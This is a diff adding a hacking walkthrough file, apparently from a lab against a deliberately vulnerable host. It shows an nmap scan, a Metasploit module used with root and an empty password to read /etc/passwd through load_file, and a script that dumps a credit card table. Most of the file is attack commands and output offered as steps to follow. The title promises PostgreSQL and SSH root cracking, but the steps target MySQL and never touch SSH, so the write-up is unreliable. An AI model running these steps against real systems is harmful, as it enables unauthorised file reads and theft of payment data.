@@ -1,0 +1,135 @@
+STEPS TO HACK PostgreSQL DATABASE & CRACK SSH ROOT PASSWORD
+===========================================================
+1. NMAP SCAN TARGET
+2. SEARCH FOR TARGETED SERVICE IN YOUR SCAN RESULT
+3. START METASPLOIT CONSOLE AND DIVE INTO IT
+****************************************************************1. NMAP SCAN TARGET
+====================
+root@alice:~# nmap -sV -p5432,22 192.168.209.151
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-06 21:38 EDT
+Nmap scan report for 192.168.209.151
+Host is up (0.0019s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+MAC Address: 00:0C:29:DA:D0:D3 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.02 seconds
+
+2. SEARCH FOR TARGETED SERVICE IN YOUR SCAN RESULT
+==================================================
+root@alice:~# nmap -sV -p5432,22 192.168.209.151 > postgresSCAN.txt
+root@alice:~# egrep -i '(5432|22)' postgresSCAN.txt
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+root@alice:~# 
+
+3. START METASPLOIT CONSOLE AND DIVE INTO IT
+============================================
+
+msf exploit(multi/handler) > use auxiliary/admin/mysql/mysql_sql
+msf auxiliary(admin/mysql/mysql_sql) > show options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   PASSWORD                    no        The password for the specified username
+   RHOST                       yes       The target address
+   RPORT     3306              yes       The target port (TCP)
+   SQL       select version()  yes       The SQL to execute.
+   USERNAME                    no        The username to authenticate as
+
+msf auxiliary(admin/mysql/mysql_sql) > set RHOST 192.168.209.151
+RHOST => 192.168.209.151
+msf auxiliary(admin/mysql/mysql_sql) > set USERNAME root
+USERNAME => root
+msf auxiliary(admin/mysql/mysql_sql) > set PASSWORD ""
+PASSWORD => 
+msf auxiliary(admin/mysql/mysql_sql) > show options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   PASSWORD                    no        The password for the specified username
+   RHOST     192.168.209.151   yes       The target address
+   RPORT     3306              yes       The target port (TCP)
+   SQL       select version()  yes       The SQL to execute.
+   USERNAME  root              no        The username to authenticate as
+msf auxiliary(admin/mysql/mysql_sql) > set SQL select load_file(\'/etc/passwd\') 
+SQL => select load_file('/etc/passwd')
+msf auxiliary(admin/mysql/mysql_sql) > exploit
+
+[*] 192.168.209.151:3306 - Sending statement: 'select load_file('/etc/passwd')'...
+[*] 192.168.209.151:3306 -  | root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
+ |
+[*] Auxiliary module execution completed
+msf auxiliary(admin/mysql/mysql_sql) > 
+
+ENUMERATE DATABASE
+===================
+root@alice:~# gedit mysql_exploit.pl 
+root@alice:~# ./mysql_exploit.pl -ip 192.168.209.151 -u root -p "" -s "credit"
+
+######################################################
+Display Sensitive Tables
+------------------------------------------------------
+[String]: credit | [Found In]: [Database]:owasp10, [Table]:credit_cards, [Field]:ccid
+[String]: credit | [Found In]: [Database]:owasp10, [Table]:credit_cards, [Field]:ccnumber
+[String]: credit | [Found In]: [Database]:owasp10, [Table]:credit_cards, [Field]:ccv
+[String]: credit | [Found In]: [Database]:owasp10, [Table]:credit_cards, [Field]:expiration
+######################################################
+
+######################################################
+Display Sensitive Contents
+[Database]: owasp10, [Table]: credit_cards
+[query]: select * from owasp10.credit_cards
+------------------------------------------------------
+ccid,ccnumber,ccv,expiration
+1,4444111122223333,745,2012-03-01
+2,7746536337776330,722,2015-04-01
+3,8242325748474749,461,2016-03-01
+4,7725653200487633,230,2017-06-01
+5,1234567812345678,627,2018-11-01
+######################################################
+root@alice:~# 
